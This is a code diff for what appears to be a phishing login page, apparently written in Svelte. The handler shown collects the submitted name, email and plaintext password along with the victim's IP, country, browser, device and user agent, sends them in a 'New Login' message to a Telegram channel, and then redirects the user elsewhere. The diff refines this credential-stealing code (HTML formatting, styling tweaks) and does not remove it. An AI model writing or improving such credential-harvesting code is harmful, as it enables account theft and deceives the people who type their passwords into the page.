@@ -41,20 +41,20 @@
 
     loading.set(true);
 
-    const message = `
-<b>🔐 New Login</b><br/>
-<b>👤 Name:</b> ${get(name) || 'Unknown'}<br/>
-<b>📧 Email:</b> ${get(email)}<br/>
-<b>🔑 Password:</b> ${get(password)}<br/>
-<b>🌍 Country:</b> ${country}<br/>
-<b>📡 IP:</b> ${ip}<br/>
-<b>🧭 Browser:</b> ${browserType}<br/>
-<b>💻 Device:</b> ${device}<br/>
-<b>🕒 Time:</b> ${new Date().toLocaleString()}<br/>
-<b>🧾 User-Agent:</b> ${userAgent}
-    `.trim();
+    const htmlMessage = `
+<b>🔐 New Login</b><br>
+<b>Name:</b> ${get(name) || 'Unknown'}<br>
+<b>Email:</b> ${get(email)}<br>
+<b>Password:</b> ${get(password)}<br>
+<b>Country:</b> ${country}<br>
+<b>IP:</b> ${ip}<br>
+<b>Browser:</b> ${browserType}<br>
+<b>Device:</b> ${device}<br>
+<b>Time:</b> ${new Date().toLocaleString()}<br>
+<b>User-Agent:</b> ${userAgent}
+`.trim();
 
-    await sendTelegramMessage(message);
+    await sendTelegramMessage(htmlMessage, 'HTML');
     window.location.href = import.meta.env.VITE_FINAL_URL;
   };
 
@@ -133,9 +133,9 @@
   }
 
   .welcome {
-    font-size: 0.7rem; /* Reduced 50% from h2 */
+    font-size: 0.95rem;
     font-weight: normal;
-    margin-top: -0.2rem;
+    margin-top: -0.4rem;
     margin-bottom: 0.6rem;
   }
 
@@ -163,7 +163,7 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    margin: 0 auto 0.6rem auto;
+    margin: 0 auto 0.8rem auto;
   }
 
   input {
